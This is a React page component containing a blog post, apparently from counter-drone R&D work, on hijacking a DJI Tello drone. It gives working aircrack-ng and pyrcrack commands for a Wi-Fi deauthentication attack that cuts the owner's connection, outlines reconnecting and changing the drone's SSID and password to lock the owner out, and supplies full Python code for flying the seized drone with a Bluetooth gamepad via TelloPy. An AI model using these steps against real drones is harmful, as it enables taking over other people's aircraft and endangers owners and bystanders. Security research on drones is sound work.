import { BackToTopButton } from "@components/BackToTopButton.tsx";

export const Tello = () => {
  return (
    <div className="standard-dialog p-12">
      <div>
        <title>Blog Tello Hack</title>
        <div className="container">
          <div className="content">
            <h1 id="a-way-to-hack-dji-tello">A way to hack Dji Tello</h1>
            <p>
              I got an R&amp;D job few weeks ago that required me to hack multiple drones, also known as
              <em>Counter-Unmanned Aircraft Swarm System</em>. I'm in charge of confrontation and simulation work, but
              this is my first foray into the field, so first and foremost, I need to understand how to hack a single
              simple drone.
            </p>
            <h2 id="system-design">System design</h2>
            <p>
              Using a <strong>DJI Tello</strong> drone play victim role, a <strong>Rock Pi</strong> as attacker program
              carrier, and a <strong>GameSir T1d</strong> as attacker controller.
            </p>
            <p>
              <img src="/images/blogs/IMG20220929185104.jpg" />
            </p>
            <p>Two Wi-Fi cards are also required, one of which must be in monitor mode.</p>
            <blockquote>
              <p>
                I use 8188ru NIC, but the RockPi pre-built Ubuntu Focal <strong>didn't enable</strong> this driver by
                default; choose a right device make your life easier.
              </p>
            </blockquote>
            <p>This system use front-end and back-end separated web service architecture, based on Ubuntu Server OS.</p>
            <p>
              Use <code>kismet</code> to monitor devices information, <code>aircrack-ng</code> handle de-auth attack,
              <code>NetworkManager</code> and <code>python-socket</code> controls connection.
            </p>
            <h3 id="take-a-try-first">Take a try first</h3>
            <pre className="hljs">
              <code>
                <div>
                  sudo airmon-ng start &lt;wlan_card&gt; # Enable monitor.{"\n"}
                  <span className="hljs-meta">{"\n"}#</span>
                  <span className="bash"> Browser `localhost:2501` to use kismet web UI,</span>
                  {"\n"}
                  <span className="hljs-meta">#</span>
                  <span className="bash"> you can find drone`s MAC address easily.</span>
                  {"\n"}kismet -c &lt;wlan_card_mon&gt;{"\n"}
                  <span className="hljs-meta">{"\n"}#</span>
                  <span className="bash"> Connect to your drone from phone app, and de-authentication yourself</span>
                  {"\n"}sudo aireplay -D -deauth 10 -a &lt;drone_macaddr&gt; &lt;another_wlan_card&gt;{"\n"}
                </div>
              </code>
            </pre>
            <p>
              During a de-auth attack, the connection becomes extremely unstable, even disconnecting. It's work, huh,
              but you'll notice your phone is still trying to reconnect, sometimes successfully.
            </p>
            <p>This is a sign to the hacker: the owner can get his drone back, and you don't want this happen.</p>
            <p>We need to clean what we exact need.</p>
            <h3 id="sort-out-the-needs">Sort out the needs</h3>
            <p>In theory, the hacking flow should be like this:</p>
            <ol>
              <li>de-auth attack to break connection from owner and drone.</li>
              <li>Hacker try connect drone during attack.</li>
              <li>Once connected, change drone's SSID to avoid owner connect back, also a password is necessary.</li>
              <li>Hacker can use a controller to control drone.</li>
            </ol>
            <h2 id="development">Development</h2>
            <h3 id="monitor">Monitor</h3>
            <p>
              Locate to <strong>kismet</strong> web ui &gt; setting &gt; api &gt; api token, create a token that you can
              use kismet as a web server, there is a API allow you have devices data with closable fields:
              <code>/devices/views/phydot11_accesspoints/devices.json</code>
            </p>
            <pre className="hljs">
              <code>
                <div>
                  <span className="hljs-comment">// TypeScript</span>
                  {"\n"}
                  <span className="hljs-keyword">declare</span> <span className="hljs-keyword">namespace</span> API{" "}
                  {"{"}
                  {"\n"}
                  {"    "}
                  <span className="hljs-keyword">interface</span> Drone_Data {"{"}
                  {"\n"}
                  {"        "}[x: <span className="hljs-built_in">string</span>]:{" "}
                  <span className="hljs-built_in">any</span>;{"\n"}
                  {"        "}data?: [];{"\n"}
                  {"    "}
                  {"}"}
                  {"\n"}
                  {"}"}
                  {"\n"}
                  {"\n"}
                  <span className="hljs-keyword">export</span> <span className="hljs-keyword">async</span>{" "}
                  <span className="hljs-function">
                    <span className="hljs-keyword">function</span> <span className="hljs-title">getDroneInfo</span>(
                    <span className="hljs-params" />){" "}
                  </span>
                  {"{"}
                  {"\n"}
                  {"    "}
                  <span className="hljs-keyword">return</span> request&lt;API.Drone_Data&gt;({"\n"}
                  {"        "}
                  <span className="hljs-string">"/devices/views/phydot11_accesspoints/devices.json"</span>,{"\n"}
                  {"        "}
                  {"{"}
                  {"\n"}
                  {"            "}method: <span className="hljs-string">"POST"</span>,{"\n"}
                  {"            "}params: {"{"} KISMET: <span className="hljs-string">"a_kismet_api_token"</span> {"}"},
                  {"\n"}
                  {"            "}data: {"{"}
                  {"\n"}
                  {"                "}fields: [{"\n"}
                  {"                    "}
                  <span className="hljs-string">"kismet.device.base.macaddr"</span>,{"\n"}
                  {"                    "}
                  <span className="hljs-string">"uav.device"</span>,{"\n"}
                  {"                    "}
                  <span className="hljs-string">"kismet.device.base.commonname"</span>,{"\n"}
                  {"                    "}
                  <span className="hljs-string">"kismet.device.base.channel"</span>,{"\n"}
                  {"                    "}
                  <span className="hljs-string">"dot11.device/dot11.device.associate_ssid_map"</span>
                  {"\n"}
                  {"                "}],{"\n"}
                  {"            "}
                  {"}"},{"\n"}
                  {"            "}...(Option || []),{"\n"}
                  {"        "}
                  {"}"},{"\n"}
                  {"    "});{"\n"}
                  {"}"}
                  {"\n"}
                </div>
              </code>
            </pre>
            <h3 id="attacker">Attacker</h3>
            <p>
              <strong>pyrcrack</strong> have a simple command to achieve de-auth attack:
            </p>
            <pre className="hljs">
              <code>
                <div>
                  <span className="hljs-comment"># Python</span>
                  {"\n"}
                  <span className="hljs-keyword">import</span> asyncio{"\n"}
                  {"\n"}
                  <span className="hljs-keyword">from</span> pyrcrack <span className="hljs-keyword">import</span>{" "}
                  AireplayNg{"\n"}
                  {"\n"}
                  {"\n"}
                  <span className="hljs-keyword">async</span>{" "}
                  <span className="hljs-function">
                    <span className="hljs-keyword">def</span> <span className="hljs-title">deauth</span>
                    <span className="hljs-params">(interface, macaddr, cliaddr)</span>:
                  </span>
                  {"\n"}
                  {"    "}
                  <span className="hljs-keyword">async</span> <span className="hljs-keyword">with</span> AireplayNg(){" "}
                  <span className="hljs-keyword">as</span> aireplay:{"\n"}
                  {"        "}
                  <span className="hljs-keyword">async</span> <span className="hljs-keyword">for</span> res{" "}
                  <span className="hljs-keyword">in</span> aireplay(interface, deauth=
                  <span className="hljs-number">10</span>, D=<span className="hljs-literal">True</span>, a=macaddr,
                  c=cliaddr):{"\n"}
                  {"            "}
                  <span className="hljs-keyword">await</span> asyncio.sleep(<span className="hljs-number">1</span>)
                  {"\n"}
                  {"\n"}
                  <span className="hljs-comment"># Usage:</span>
                  {"\n"}
                  <span className="hljs-comment">
                    # asyncio.run(deauth('wlan_card_mon','kismet.device.base.macaddr',
                  </span>
                  {"\n"}
                  <span className="hljs-comment"># 'dot11.device/dot11.device.associate_ssid_map'))</span>
                  {"\n"}
                  {"\n"}
                </div>
              </code>
            </pre>
            <p>
              Declare "cliaddr" which is the last connection device from drone, let de-auth attack only effect between
              drone and its owner.
            </p>
            <h3 id="controller">Controller</h3>
            <p>
              Duo to the GameSir T1d cannot connect to the drone directly when hacked, I decided to use
              <strong>TelloPy</strong> as controller middleware to convert the T1d signal into a drone control command.
            </p>
            <p>
              T1d uses Bluetooth protocol to transmit data; there are three Services, with the third receiving an
              unchanged byte stream and the second changing at random. The byte stream received by a Service whose UUID
              begins with
              <code>00008651</code> changes on a regular basis.
            </p>
            <p>
              When T1d on idle, the value received by the first Service is always been
              <code>C9-C6-86-A1-00-DB-B9-03-01-01-01-0B-01-E1-07-07-06-10-1E-56</code>.
            </p>
            <p>
              The first two Bytes are always <code>A1-C5</code> when there is action.
            </p>
            <p>As a result, the first two bytes can be used to determine the state of the remote control.</p>
            <blockquote>
              <p>
                Notice: Rock Pi is Big-Endian, you will need change the hex value
                <code>A1-C5</code> to <code>C5-A1</code>.
              </p>
            </blockquote>
            <p>
              The last byte is always self-incrementing when T1d status on
              <code>C5-A1</code>.
            </p>
            <p>
              When you press the button, the byte will increase by 2 until
              <code>0xFF</code>, then return to <code>0x00</code>. This is used to keep track of how many times the
              button is pressed.
            </p>
            <p>
              Bytes 10-13 represent the state of the pressed button, and each button on the handle corresponds to one
              bit. In fact, as long as these bytes are read out one by one, they can correspond to the keys.
            </p>
            <p>
              For stickers, bytes 3-7 represent the joystick's state. It took some time to figure out which joystick
              corresponded to which bytes at first. Later, I discovered that it was actually quite simple to guess. A
              total of 5 bytes, 2 joysticks in a total of 4 directions, resulting in 10bit per direction.
            </p>
            <p>In general, 10bit AD is also quite common.</p>
            <pre className="hljs">
              <code>
                <div>
                  11 bits (-1024 ~ +1023) x 4 axis = 44 bits{"\n"}fast_mode takes 1 bit{"\n"}44 bits will be packed in
                  to 6 bytes (48 bits){"\n"}
                  {"            "}axis4{"      "}axis3{"      "}axis2{"      "}axis1{"\n"}
                  {"     "}|{"          "}|{"          "}|{"          "}|{"          "}|{"\n"}
                  {"         "}4{"         "}3{"         "}2{"         "}1{"         "}0{"\n"}
                  98765432109876543210987654321098765432109876543210{"\n"} |{"       "}|{"       "}|{"       "}|
                  {"       "}|{"       "}|{"       "}|{"\n"}
                  {"     "}byte5{"   "}byte4{"   "}byte3{"   "}byte2{"   "}byte1{"   "}byte0{"\n"}
                </div>
              </code>
            </pre>
            <p>
              So long as these bytes are read out and then rounded up every 10 bits into an integer, the joystick can be
              read again.
            </p>
            <p>A example code for displaying the T1d signal value is as follows:</p>
            <pre className="hljs">
              <code>
                <div>
                  <span className="hljs-comment"># Python</span>
                  {"\n"}
                  <span className="hljs-keyword">import</span> time{"\n"}
                  <span className="hljs-keyword">import</span> struct{"\n"}
                  <span className="hljs-keyword">from</span> bluepy.btle <span className="hljs-keyword">import</span>{" "}
                  Peripheral{"\n"}
                  {"\n"}my_gamesir = Peripheral(<span className="hljs-string">'t1d_macaddr'</span>,{" "}
                  <span className="hljs-string">'random'</span>){"\n"}services = my_gamesir.getServices(){"  "}
                  <span className="hljs-comment"># get bluetooth service from device</span>
                  {"\n"}
                  {"\n"}
                  <span className="hljs-keyword">for</span> service <span className="hljs-keyword">in</span> services:
                  {"\n"}
                  {"    "}services_to_list = list(services){"  "}
                  <span className="hljs-comment"># convert dict to list</span>
                  {"\n"}
                  {"    "}control_service = services_to_list[<span className="hljs-number">2</span>]{"  "}
                  <span className="hljs-comment"># get elements on index 2</span>
                  {"\n"}
                  {"    "}charac_dics = control_service.getCharacteristics(){"  "}
                  <span className="hljs-comment"># get bluetooth characteristics</span>
                  {"\n"}
                  {"    "}
                  <span className="hljs-keyword">for</span> charac <span className="hljs-keyword">in</span> charac_dics:
                  {"\n"}
                  {"        "}print(charac.uuid){"\n"}
                  {"        "}
                  <span className="hljs-keyword">pass</span>
                  {"\n"}
                  {"    "}
                  <span className="hljs-keyword">while</span> <span className="hljs-literal">True</span>:{"\n"}
                  {"        "}time.sleep(<span className="hljs-number">0.1</span>){"\n"}
                  {"        "}charac1, charac2, charac3 = [item.read() <span className="hljs-keyword">for</span> item{" "}
                  <span className="hljs-keyword">in</span> charac_dics]{"\n"}
                  {"        "}status_code = struct.unpack(<span className="hljs-string">'H'</span>, charac1[:
                  <span className="hljs-number">2</span>])[<span className="hljs-number">0</span>]{"\n"}
                  {"\n"}
                  {"        "}print(status_code){"\n"}
                  {"\n"}
                  {"        "}
                  <span className="hljs-keyword">if</span> status_code == <span className="hljs-number">50593</span>:
                  {"\n"}
                  {"            "}
                  <span className="hljs-comment"># key value, each key on the joystick has a fixed value.</span>
                  {"\n"}
                  {"            "}on_press_key = struct.unpack(<span className="hljs-string">'I'</span>, charac1[
                  <span className="hljs-number">9</span>:<span className="hljs-number">13</span>])[
                  <span className="hljs-number">0</span>]{"\n"}
                  {"\n"}
                  {"            "}bar_status = struct.unpack(<span className="hljs-string">'5B'</span>, charac1[
                  <span className="hljs-number">2</span>:<span className="hljs-number">7</span>]){"\n"}
                  {"            "}bar_status_bin = <span className="hljs-string">''</span>.join([bin(item).split(
                  <span className="hljs-string">'b'</span>)[<span className="hljs-number">1</span>].rjust({"\n"}
                  {"                "}
                  <span className="hljs-number">8</span>).replace(<span className="hljs-string">' '</span>,{" "}
                  <span className="hljs-string">'0'</span>) <span className="hljs-keyword">for</span> item{" "}
                  <span className="hljs-keyword">in</span> bar_status]){"\n"}
                  {"\n"}
                  {"            "}left_x = (bar_status_bin[<span className="hljs-number">0</span>:
                  <span className="hljs-number">10</span>], <span className="hljs-number">2</span>){"\n"}
                  {"            "}left_y = (bar_status_bin[<span className="hljs-number">10</span>:
                  <span className="hljs-number">20</span>], <span className="hljs-number">2</span>){"\n"}
                  {"            "}right_x = (bar_status_bin[<span className="hljs-number">20</span>:
                  <span className="hljs-number">30</span>], <span className="hljs-number">2</span>){"\n"}
                  {"\n"}
                  {"            "}
                  <span className="hljs-comment"># convert to int will see the value is 0~1023,</span>
                  {"\n"}
                  {"            "}
                  <span className="hljs-comment">
                    # on idle is 512 (0x200), push forward is 512~0, backward is 512~1023
                  </span>
                  {"\n"}
                  {"            "}right_y = int(bar_status_bin[<span className="hljs-number">30</span>:
                  <span className="hljs-number">40</span>], <span className="hljs-number">2</span>){"\n"}
                  {"\n"}
                  {"            "}print(<span className="hljs-string">"status %s"</span> % status_code, end=
                  <span className="hljs-string">'{"  "}'</span>){"\n"}
                  {"            "}print(<span className="hljs-string">"on_press %s"</span> % on_press_key, end=
                  <span className="hljs-string">'{"  "}'</span>){"\n"}
                  {"            "}print(<span className="hljs-string">"left_x %s"</span> % left_x, end=
                  <span className="hljs-string">'{"  "}'</span>){"\n"}
                  {"            "}print(<span className="hljs-string">"right_x %s"</span> % right_x, end=
                  <span className="hljs-string">'{"  "}'</span>){"\n"}
                  {"            "}print(<span className="hljs-string">"left_y %s"</span> % left_y, end=
                  <span className="hljs-string">'{"  "}'</span>){"\n"}
                  {"            "}print(<span className="hljs-string">"right_y %s"</span> % right_y, end=
                  <span className="hljs-string">'\r'</span>){"\n"}
                </div>
              </code>
            </pre>
            <p>Mapping keys to the hex value:</p>
            <pre className="hljs">
              <code>
                <div>
                  <span className="hljs-comment"># Python</span>
                  {"\n"}
                  <span className="hljs-comment"># Big endian</span>
                  {"\n"}switch = {"{"}
                  {"\n"}
                  {"    "}
                  <span className="hljs-number">0x40</span>: <span className="hljs-string">'L1'</span>,{"\n"}
                  {"    "}
                  <span className="hljs-number">0x80</span>: <span className="hljs-string">'R1'</span>,{"\n"}
                  {"    "}
                  <span className="hljs-number">0x100</span>: <span className="hljs-string">'L2'</span>,{"\n"}
                  {"    "}
                  <span className="hljs-number">0x200</span>: <span className="hljs-string">'R2'</span>,{"\n"}
                  {"    "}
                  <span className="hljs-number">0x01</span>: <span className="hljs-string">'A'</span>,{"\n"}
                  {"    "}
                  <span className="hljs-number">0x02</span>: <span className="hljs-string">'B'</span>,{"\n"}
                  {"    "}
                  <span className="hljs-number">0x08</span>: <span className="hljs-string">'X'</span>,{"\n"}
                  {"    "}
                  <span className="hljs-number">0x10</span>: <span className="hljs-string">'Y'</span>,{"\n"}
                  {"    "}
                  <span className="hljs-number">0x4</span>: <span className="hljs-string">'Menu'</span>,{"\n"}
                  {"    "}
                  <span className="hljs-number">0x400</span>: <span className="hljs-string">'C1'</span>,{"\n"}
                  {"    "}
                  <span className="hljs-number">0x800</span>: <span className="hljs-string">'C2'</span>,{"\n"}
                  {"    "}
                  <span className="hljs-number">0x10000</span>: <span className="hljs-string">'Up'</span>,{"\n"}
                  {"    "}
                  <span className="hljs-number">0x30000</span>: <span className="hljs-string">'Right'</span>,{"\n"}
                  {"    "}
                  <span className="hljs-number">0x50000</span>: <span className="hljs-string">'Down'</span>,{"\n"}
                  {"    "}
                  <span className="hljs-number">0x70000</span>: <span className="hljs-string">'Left'</span>,{"\n"}
                  {"}"}
                  {"\n"}
                </div>
              </code>
            </pre>
            <p>
              <strong>TelloPy</strong> gave a game controller stick mapper (function <code>__send_stick_command</code>)
              to control drone, so I motif it to adapt T1d:
            </p>
            <pre className="hljs">
              <code>
                <div>
                  <span className="hljs-comment"># Python</span>
                  {"\n"}
                  <span className="hljs-function">
                    <span className="hljs-keyword">def</span> <span className="hljs-title">_send_stick_command</span>
                    <span className="hljs-params">(drone, stick_values)</span>:
                  </span>
                  {"\n"}
                  {"    "}pkt = Packet(STICK_CMD, <span className="hljs-number">0x60</span>){"\n"}
                  {"    "}left_x, left_y, right_x, right_y = stick_values{"\n"}
                  {"\n"}
                  {"    "}axis1 = (<span className="hljs-number">512</span> + left_x) &amp;{" "}
                  <span className="hljs-number">0x7ff</span>
                  {"\n"}
                  {"    "}axis2 = (<span className="hljs-number">1536</span> - right_y) &amp;{" "}
                  <span className="hljs-number">0x7ff</span>
                  {"\n"}
                  {"    "}axis3 = (<span className="hljs-number">1536</span> - left_y) &amp;{" "}
                  <span className="hljs-number">0x7ff</span>
                  {"\n"}
                  {"    "}axis4 = (<span className="hljs-number">512</span> + right_x) &amp;{" "}
                  <span className="hljs-number">0x7ff</span>
                  {"\n"}
                  {"\n"}
                  {"    "}pkt.add_byte(((axis2 &lt;&lt; <span className="hljs-number">11</span> | axis1) &gt;&gt;{" "}
                  <span className="hljs-number">0</span>) &amp; <span className="hljs-number">0xff</span>){"\n"}
                  {"    "}pkt.add_byte(((axis2 &lt;&lt; <span className="hljs-number">11</span> | axis1) &gt;&gt;{" "}
                  <span className="hljs-number">8</span>) &amp; <span className="hljs-number">0xff</span>){"\n"}
                  {"    "}pkt.add_byte(((axis3 &lt;&lt; <span className="hljs-number">11</span> | axis2) &gt;&gt;{" "}
                  <span className="hljs-number">5</span>) &amp; <span className="hljs-number">0xff</span>){"\n"}
                  {"    "}pkt.add_byte(((axis4 &lt;&lt; <span className="hljs-number">11</span> | axis3) &gt;&gt;{" "}
                  <span className="hljs-number">2</span>) &amp; <span className="hljs-number">0xff</span>){"\n"}
                  {"    "}pkt.add_byte(((axis4 &lt;&lt; <span className="hljs-number">11</span> | axis3) &gt;&gt;{" "}
                  <span className="hljs-number">10</span>) &amp; <span className="hljs-number">0xff</span>){"\n"}
                  {"    "}pkt.add_byte(((axis4 &lt;&lt; <span className="hljs-number">11</span> | axis3) &gt;&gt;{" "}
                  <span className="hljs-number">18</span>) &amp; <span className="hljs-number">0xff</span>){"\n"}
                  {"    "}pkt.add_time(){"\n"}
                  {"    "}pkt.fixup(){"\n"}
                  {"    "}drone.send_packet(pkt){"\n"}
                </div>
              </code>
            </pre>
            <p>Finally, we can connect to a drone and control ti with T1d:</p>
            <pre className="hljs">
              <code>
                <div>
                  <span className="hljs-comment"># Python</span>
                  {"\n"}
                  <span className="hljs-keyword">import</span> struct{"\n"}
                  <span className="hljs-keyword">import</span> sys{"\n"}
                  {"\n"}
                  <span className="hljs-keyword">from</span> tellopy <span className="hljs-keyword">import</span> Tello
                  {"\n"}
                  <span className="hljs-keyword">from</span> tellopy._internal.protocol{" "}
                  <span className="hljs-keyword">import</span> Packet, STICK_CMD{"\n"}
                  <span className="hljs-keyword">from</span> bluepy.btle <span className="hljs-keyword">import</span>{" "}
                  Peripheral{"\n"}
                  {"\n"}global_data = <span className="hljs-literal">None</span>
                  {"\n"}
                  {"\n"}
                  {"\n"}
                  <span className="hljs-function">
                    <span className="hljs-keyword">def</span> <span className="hljs-title">_send_stick_command</span>
                    <span className="hljs-params">(drone, stick_values)</span>:
                  </span>
                  {"\n"}
                  {"    "}pkt = Packet(STICK_CMD, <span className="hljs-number">0x60</span>){"\n"}
                  {"    "}left_x, left_y, right_x, right_y = stick_values{"\n"}
                  {"\n"}
                  {"    "}axis1 = (<span className="hljs-number">512</span> + left_x) &amp;{" "}
                  <span className="hljs-number">0x7ff</span>
                  {"\n"}
                  {"    "}axis2 = (<span className="hljs-number">1536</span> - right_y) &amp;{" "}
                  <span className="hljs-number">0x7ff</span>
                  {"\n"}
                  {"    "}axis3 = (<span className="hljs-number">1536</span> - left_y) &amp;{" "}
                  <span className="hljs-number">0x7ff</span>
                  {"\n"}
                  {"    "}axis4 = (<span className="hljs-number">512</span> + right_x) &amp;{" "}
                  <span className="hljs-number">0x7ff</span>
                  {"\n"}
                  {"\n"}
                  {"    "}pkt.add_byte(((axis2 &lt;&lt; <span className="hljs-number">11</span> | axis1) &gt;&gt;{" "}
                  <span className="hljs-number">0</span>) &amp; <span className="hljs-number">0xff</span>){"\n"}
                  {"    "}pkt.add_byte(((axis2 &lt;&lt; <span className="hljs-number">11</span> | axis1) &gt;&gt;{" "}
                  <span className="hljs-number">8</span>) &amp; <span className="hljs-number">0xff</span>){"\n"}
                  {"    "}pkt.add_byte(((axis3 &lt;&lt; <span className="hljs-number">11</span> | axis2) &gt;&gt;{" "}
                  <span className="hljs-number">5</span>) &amp; <span className="hljs-number">0xff</span>){"\n"}
                  {"    "}pkt.add_byte(((axis4 &lt;&lt; <span className="hljs-number">11</span> | axis3) &gt;&gt;{" "}
                  <span className="hljs-number">2</span>) &amp; <span className="hljs-number">0xff</span>){"\n"}
                  {"    "}pkt.add_byte(((axis4 &lt;&lt; <span className="hljs-number">11</span> | axis3) &gt;&gt;{" "}
                  <span className="hljs-number">10</span>) &amp; <span className="hljs-number">0xff</span>){"\n"}
                  {"    "}pkt.add_byte(((axis4 &lt;&lt; <span className="hljs-number">11</span> | axis3) &gt;&gt;{" "}
                  <span className="hljs-number">18</span>) &amp; <span className="hljs-number">0xff</span>){"\n"}
                  {"    "}pkt.add_time(){"\n"}
                  {"    "}pkt.fixup(){"\n"}
                  {"    "}drone.send_packet(pkt){"\n"}
                  {"\n"}
                  {"\n"}
                  <span className="hljs-function">
                    <span className="hljs-keyword">def</span> <span className="hljs-title">_get_stick_values</span>
                    <span className="hljs-params">(chars1)</span>:
                  </span>
                  {"\n"}
                  {"    "}bar_status = struct.unpack(<span className="hljs-string">'5B'</span>, chars1[
                  <span className="hljs-number">2</span>:<span className="hljs-number">7</span>]){"\n"}
                  {"    "}bar_status_bin = <span className="hljs-string">''</span>.join([bin(item).split(
                  <span className="hljs-string">'b'</span>)[<span className="hljs-number">1</span>].rjust({"\n"}
                  {"        "}
                  <span className="hljs-number">8</span>).replace(<span className="hljs-string">' '</span>,{" "}
                  <span className="hljs-string">'0'</span>) <span className="hljs-keyword">for</span> item{" "}
                  <span className="hljs-keyword">in</span> bar_status]){"\n"}
                  {"\n"}
                  {"    "}left_x = int(bar_status_bin[<span className="hljs-number">0</span>:
                  <span className="hljs-number">10</span>], <span className="hljs-number">2</span>){"\n"}
                  {"    "}left_y = int(bar_status_bin[<span className="hljs-number">10</span>:
                  <span className="hljs-number">20</span>], <span className="hljs-number">2</span>){"\n"}
                  {"    "}right_x = int(bar_status_bin[<span className="hljs-number">20</span>:
                  <span className="hljs-number">30</span>], <span className="hljs-number">2</span>){"\n"}
                  {"    "}right_y = int(bar_status_bin[<span className="hljs-number">30</span>:
                  <span className="hljs-number">40</span>], <span className="hljs-number">2</span>){"\n"}
                  {"\n"}
                  {"    "}
                  <span className="hljs-keyword">return</span> [left_x, left_y, right_x, right_y]{"\n"}
                  {"\n"}
                  {"\n"}
                  <span className="hljs-function">
                    <span className="hljs-keyword">def</span> <span className="hljs-title">dispatch</span>
                    <span className="hljs-params">(drone, chars1)</span>:
                  </span>
                  {"\n"}
                  {"    "}
                  <span className="hljs-keyword">global</span> flight_data{"\n"}
                  {"    "}status_code = struct.unpack(<span className="hljs-string">'H'</span>, chars1[:
                  <span className="hljs-number">2</span>])[<span className="hljs-number">0</span>]{"\n"}
                  {"\n"}
                  {"    "}
                  <span className="hljs-keyword">if</span> status_code == <span className="hljs-number">0xC5A1</span>:
                  {"\n"}
                  {"        "}keys = struct.unpack(<span className="hljs-string">'I'</span>, chars1[
                  <span className="hljs-number">9</span>:<span className="hljs-number">13</span>])[
                  <span className="hljs-number">0</span>]{"\n"}
                  {"        "}
                  <span className="hljs-keyword">if</span> (keys == <span className="hljs-number">0x110</span>):{"\n"}
                  {"            "}drone.flip_forward(){"\n"}
                  {"        "}
                  <span className="hljs-keyword">elif</span> (keys == <span className="hljs-number">0x210</span>):{"\n"}
                  {"            "}
                  <span className="hljs-keyword">if</span> (flight_data <span className="hljs-keyword">and</span>{" "}
                  flight_data.height &gt; <span className="hljs-number">0.5</span>):{"\n"}
                  {"                "}drone.land(){"\n"}
                  {"            "}
                  <span className="hljs-keyword">else</span>:{"\n"}
                  {"                "}drone.takeoff(){"\n"}
                  {"        "}
                  <span className="hljs-keyword">elif</span> (keys == <span className="hljs-number">0</span>):{"\n"}
                  {"            "}_send_stick_command(drone, _get_stick_values(chars1)){"\n"}
                  {"\n"}
                  {"\n"}
                  <span className="hljs-function">
                    <span className="hljs-keyword">def</span> <span className="hljs-title">handler</span>
                    <span className="hljs-params">(event, sender, data, **args)</span>:
                  </span>
                  {"\n"}
                  {"    "}
                  <span className="hljs-keyword">global</span> flight_data{"\n"}
                  {"    "}
                  <span className="hljs-keyword">if</span> event <span className="hljs-keyword">is</span>{" "}
                  sender.EVENT_FLIGHT_DATA:{"\n"}
                  {"        "}flight_data = data{"\n"}
                  {"\n"}
                  {"\n"}
                  <span className="hljs-function">
                    <span className="hljs-keyword">def</span> <span className="hljs-title">_connect_drone</span>
                    <span className="hljs-params">(drone)</span>:
                  </span>
                  {"\n"}
                  {"    "}
                  <span className="hljs-keyword">try</span>:{"\n"}
                  {"        "}drone.subscribe(drone.EVENT_FLIGHT_DATA, handler){"\n"}
                  {"        "}drone.connect(){"\n"}
                  {"        "}drone.wait_for_connection(<span className="hljs-number">60.0</span>){"\n"}
                  {"    "}
                  <span className="hljs-keyword">except</span> Exception <span className="hljs-keyword">as</span> ex:
                  {"\n"}
                  {"        "}print(<span className="hljs-string">"Unable to connect drones%s"</span> % ex){"\n"}
                  {"\n"}
                  {"\n"}
                  <span className="hljs-function">
                    <span className="hljs-keyword">def</span> <span className="hljs-title">main</span>
                    <span className="hljs-params">()</span>:
                  </span>
                  {"\n"}
                  {"    "}drone = Tello(){"\n"}
                  {"    "}
                  <span className="hljs-keyword">try</span>:{"\n"}
                  {"        "}_connect_drone(drone){"\n"}
                  {"\n"}
                  {"        "}gamesir_t1d = Peripheral(&lt;t1d_macaddr&gt;,{" "}
                  <span className="hljs-string">'random'</span>){"\n"}
                  {"\n"}
                  {"        "}
                  <span className="hljs-keyword">while</span> <span className="hljs-literal">True</span>:{"\n"}
                  {"            "}chars_dics = list(gamesir_t1d.getServices())[{"\n"}
                  {"                "}
                  <span className="hljs-number">2</span>].getCharacteristics(){"\n"}
                  {"\n"}
                  {"            "}chars1, _chars2, _chars3 = [item.read() <span className="hljs-keyword">for</span> item{" "}
                  <span className="hljs-keyword">in</span> chars_dics]{"\n"}
                  {"            "}dispatch(drone, chars1){"\n"}
                  {"\n"}
                  {"    "}
                  <span className="hljs-keyword">except</span> KeyboardInterrupt:{"\n"}
                  {"        "}print(<span className="hljs-string">"Existing..."</span>){"\n"}
                  {"        "}drone.land(){"\n"}
                  {"        "}drone.quit(){"\n"}
                  {"        "}sys.exit(){"\n"}
                  {"\n"}
                  <span className="hljs-keyword">if</span> __name__ == <span className="hljs-string">'__main__'</span>:
                  {"\n"}
                  {"    "}main(){"\n"}
                  {"\n"}
                  {"\n"}
                  <span className="hljs-comment"># Usage:</span>
                  {"\n"}
                  <span className="hljs-comment"># 1. Change &lt;t1d_macaddr&gt; to your GameSir T1d MAC address.</span>
                  {"\n"}
                  <span className="hljs-comment"># 2. Connect to drone.</span>
                  {"\n"}
                  <span className="hljs-comment"># 3. `python3 this.program.py`</span>
                  {"\n"}
                  {"\n"}
                </div>
              </code>
            </pre>
            <p>
              There are still some "TODO:" items to complete, such as the rub connection and changing the SSID; I won't
              go into detail in this blog, but here are some points:
            </p>
            <ul>
              <li>
                <p>
                  Ubuntu controls Wi-Fi via NetworkManager, I use d-bus to control NetworkManager. Create a
                  multithreaded process that sends connection requests erratically during a de-auth attack.
                </p>
              </li>
              <li>
                <p>
                  The Tello SDK includes a Python example that demonstrates how to send a text command:
                  <code>sock.sendto('wifi new ssid&gt; pwd&gt;', tello address)</code>.
                </p>
              </li>
              <li>
                <p>
                  The hole program has multiple job running in asynchronous, jobs need response a statue to frontend,
                  use a task queue such as
                  <code>flask-celery</code> will make schedule easier.
                </p>
              </li>
            </ul>
            <h2 id="references--spacial-thanks">References &amp; Spacial thanks</h2>
            <p>
              <a href="https://github.com/NetworkManager/NetworkManager/blob/main/examples/python/dbus/add-wifi-psk-connection.py">
                https://github.com/NetworkManager/NetworkManager/blob/main/examples/python/dbus/add-wifi-psk-connection.py
              </a>
            </p>
            <p>
              <a href="https://github.com/Diallomm/hack_GamesirT1d">https://github.com/Diallomm/hack_GamesirT1d</a>
            </p>
            <p>
              <a href="https://github.com/hanyazou/TelloPy">https://github.com/hanyazou/TelloPy</a>
            </p>
            <p>
              <a href="https://github.com/Matthias84/awesome-tello">https://github.com/Matthias84/awesome-tello</a>
            </p>
          </div>
        </div>
      </div>

      <BackToTopButton />
    </div>
  );
};
